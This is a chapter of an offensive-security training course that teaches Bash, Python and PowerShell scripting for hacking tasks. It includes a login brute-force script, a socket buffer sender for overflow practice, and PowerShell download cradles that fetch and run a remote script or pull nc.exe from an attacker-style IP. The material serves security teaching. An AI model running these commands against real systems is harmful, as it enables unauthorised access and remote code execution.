# Scripting Prerequisites: Python, Bash & PowerShell

---
title: "Scripting Prerequisites"
parent: "[[01_Foundations]]"
tags:
  - foundations
  - scripting
  - python
  - bash
  - powershell
  - automation
created: 2026-01-23
updated: 2026-01-23
---

> **Executive Summary**: Hacking is rarely a manual process. It is the automation of interactions with complex systems. You will encounter scenarios where you need to scan 10,000 IPs, parse a 500MB log file, or interact with a custom binary protocol. Manual tools (GUI) will fail you. This chapter covers the syntax, logic, and specific use-cases for the "Big Three" languages of offensive security: **Bash** (Linux Glue), **Python** (Exploit Development), and **PowerShell** (Windows Administration).

---

## Table of Contents
1. [Learning Objectives](#1-learning-objectives)
2. [The Polyglot Hacker: Choosing the Right Tool](#2-the-polyglot-hacker-choosing-the-right-tool)
3. [Deep Dive: Bash (The Glue)](#3-deep-dive-bash-the-glue)
4. [Deep Dive: Python (The Exploiter)](#4-deep-dive-python-the-exploiter)
5. [Deep Dive: PowerShell (The Admin)](#5-deep-dive-powershell-the-admin)
6. [Regular Expressions (Regex): The Universal Search](#6-regular-expressions-regex-the-universal-search)
7. [Practical Lab: The Rosetta Stone](#7-practical-lab-the-rosetta-stone)
8. [Critical Analysis & Checkpoints](#8-critical-analysis--checkpoints)

---

## 1. Learning Objectives

By the end of this chapter, you will be able to:

- **Automate Recon**: Write Bash "one-liners" to chain Nmap, Grep, and Cut into powerful recon pipelines.
- **Develop Exploits**: Use Python `requests` and `socket` libraries to interact with web and network services.
- **Administer Windows**: Use PowerShell pipeline objects to filter running processes and services.
- **Parse Data**: Master Regex to extract IPs, emails, and SSNs from unstructured text.
- **Translate Logic**: Take a concept ("Loop through IPs") and implement it in all three languages.

---

## 2. The Polyglot Hacker: Choosing the Right Tool

| Feature | **Bash** | **Python** | **PowerShell** |
|:---|:---|:---|:---|
| **Primary OS** | Linux | Cross-Platform | Windows |
| **Philosophy** | "Everything is a file/text stream" | "Explicit is better than implicit" | "Everything is an Object" |
| **Best For** | Quick parsing, piping tools together, system admin tasks. | Writing exploits, complex logic, network sockets, crypto. | AD Enumeration, Windows Config, Post-Exploitation. |
| **Speed** | Fast for file ops, slow for math. | Moderate (Interpreted). | Slow startup, fast execution. |
| **Dependency** | None (Native). | Requires Interpreter. | None (Native on Win7+). |

---

## 3. Deep Dive: Bash (The Glue)

Bash is about **Streams**. Data flows from STDIN -> Command -> STDOUT.

### 3.1 Streams and Redirection
- **Standard Input (0)**: Keyboard.
- **Standard Output (1)**: Screen.
- **Standard Error (2)**: Error messages.

**Redirection**:
- `>` : Overwrite file (`echo "hi" > file.txt`).
- `>>`: Append to file (`echo "hi" >> file.txt`).
- `2>`: Redirect errors (`ls /root 2> /dev/null` hides "Permission Denied").
- `|`: Pipe output of Command A to Input of Command B.

### 3.2 The "One-Liner"
The hallmark of a Linux pro.
**Scenario**: Find all live hosts in `scan.gnmap`, sort them, and count occurrences.
```bash
cat scan.gnmap | grep "Status: Up" | cut -d " " -f 2 | sort | uniq -c | sort -nr
```

### 3.3 Loops
**The For Loop (List)**:
```bash
for ip in $(cat ips.txt); do nmap -p 80 $ip; done
```
**The For Loop (Range)**:
```bash
for i in {1..254}; do ping -c 1 192.168.1.$i; done
```
**The While Loop (Line by Line)**:
```bash
while read line; do echo "Scanning $line"; done < ips.txt
```

### 3.4 Command Substitution
Putting a command inside `$()` runs it and replaces the text with the output.
```bash
echo "Today is $(date)"
# Output: Today is Fri Jan 22 ...
```

---

## 4. Deep Dive: Python (The Exploiter)

Python is about **Libraries**. Whatever you want to do, `import` it.

### 4.1 The `requests` Library (Web)
Don't use `urllib`. Use `requests`.
**Scenario**: Brute force a login.
```python
import requests

url = "http://10.10.10.5/login.php"
usernames = ["admin", "root", "user"]

for user in usernames:
    # Dictionary of POST data
    data = {"username": user, "password": "password123"}
    
    # Send POST
    r = requests.post(url, data=data)
    
    # Check response
    if "Invalid password" not in r.text:
        print(f"[+] Found user: {user}")
        break
```

### 4.2 The `socket` Library (Network)
Essential for Buffer Overflows and custom protocols.
**Scenario**: Connect to a port and send a buffer.
```python
import socket

target = "192.168.1.50"
port = 1337

try:
    # Create IPv4 (AF_INET) TCP (SOCK_STREAM) socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    
    # Receive banner
    banner = s.recv(1024)
    print(banner.decode())
    
    # Send payload (Must be bytes)
    payload = b"A" * 500
    s.send(payload)
    s.close()
except Exception as e:
    print(f"Error: {e}")
```

### 4.3 File I/O
The `with open` syntax ensures files are closed automatically.
```python
# Reading
with open("wordlist.txt", "r") as f:
    for line in f:
        print(line.strip()) # strip() removes newline

# Writing
with open("output.txt", "w") as f:
    f.write("Hello World\n")
```

---

## 5. Deep Dive: PowerShell (The Admin)

PowerShell is about **Objects**.
In Bash, `ls` returns text. In PowerShell, `Get-ChildItem` returns `FileInfo` objects with properties (Name, Length, CreationTime).

### 5.1 The Pipeline `|`
Since it passes objects, you can filter by property.
**Scenario**: Find all stopped services starting with 'X'.
```powershell
Get-Service | Where-Object {$_.Status -eq 'Stopped' -and $_.Name -like 'X*'}
```
- `$_`: The current object in the pipeline (like `this` in Java).

### 5.2 Downloading Files (Living off the Land)
When you have a shell on Windows, you need tools.
**The DownloadString Method (In Memory)**:
```powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/script.ps1')
```
- `IEX`: Invoke-Expression (Run the code downloaded).

**The DownloadFile Method (On Disk)**:
```powershell
(New-Object Net.WebClient).DownloadFile('http://10.10.14.5/nc.exe', 'C:\Temp\nc.exe')
```

### 5.3 Active Directory Module
If RSAT (Remote Server Administration Tools) is installed:
```powershell
import-module ActiveDirectory
Get-ADUser -Filter * -Properties * | Select-Object Name, LastLogonDate
```
If not, use PowerView (a script that implements AD logic without the module).

---

## 6. Regular Expressions (Regex): The Universal Search

Regex works in Bash (`grep -E`), Python (`re`), and PowerShell (`Select-String`).

### 6.1 Basic Tokens
- `.`: Any character.
- `\d`: Digit (0-9).
- `\w`: Word character (a-z, A-Z, 0-9, _).
- `\s`: Whitespace.

### 6.2 Quantifiers
- `*`: 0 or more.
- `+`: 1 or more.
- `?`: 0 or 1.
- `{n}`: Exactly n times.
- `{n,m}`: Between n and m times.

### 6.3 Anchors
- `^`: Start of string.
- `$`: End of string.

### 6.4 Common Patterns
**IP Address**:
```regex
\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}
```
**Email Address**:
```regex
[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}
```

### 6.5 Example: Extracting IPs from a Log
**Bash**:
```bash
grep -E -o "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b" access.log
```
- `-o`: Only print the match (not the whole line).

---

## 7. Practical Lab: The Rosetta Stone

**Goal**: Write a script in all three languages that:
1.  Takes a file `ips.txt`.
2.  Iterates through each IP.
3.  Prints "Scanning [IP]".

### 7.1 Bash Version
```bash
#!/bin/bash
if [ -f "ips.txt" ]; then
    while read ip; do
        echo "Scanning $ip"
    done < ips.txt
else
    echo "File not found"
fi
```

### 7.2 Python Version
```python
import os

if os.path.exists("ips.txt"):
    with open("ips.txt", "r") as f:
        for line in f:
            ip = line.strip()
            print(f"Scanning {ip}")
else:
    print("File not found")
```

### 7.3 PowerShell Version
```powershell
if (Test-Path "ips.txt") {
    Get-Content "ips.txt" | ForEach-Object {
        Write-Host "Scanning $_"
    }
} else {
    Write-Host "File not found"
}
```

---

## 8. Critical Analysis & Checkpoints

### 8.1 The "Logic" Trap
Beginners memorize syntax. Pros understand logic.
If you know *how* a loop works (Initialize -> Check Condition -> Execute Body -> Increment), the syntax (`for`, `foreach`, `while`) is just a Google search away.

### 8.2 Checkpoint Questions
1.  **Scenario**: You are on a Windows machine with NO internet and NO PowerShell access. How do you loop?
    - *Answer*: Use DOS Batch scripting (`for /L %i in (1,1,255) do ping 192.168.1.%i`). It's ugly, but it works.
2.  **Python**: What is the difference between `bytes` and `string` in Python 3?
    - *Answer*: Strings are Unicode. Bytes are raw data (`b'\x41'`). Sockets send Bytes. You must `.encode()` strings to send them and `.decode()` bytes to read them.
3.  **Regex**: Why is `.*` dangerous?
    - *Answer*: It is "Greedy". It matches as much as possible. `<a>stuff</a><b>more</b>`. `<a>.*</a>` matches the whole string, not just the first tag. Use `.*?` (Non-greedy) to stop at the first match.

### 8.3 Final Thoughts
You cannot hack effectively if you are stuck manually typing commands. Automation multiplies your force. Learn to script, and you turn one hacker into an army.

---
*End of Chapter 08*
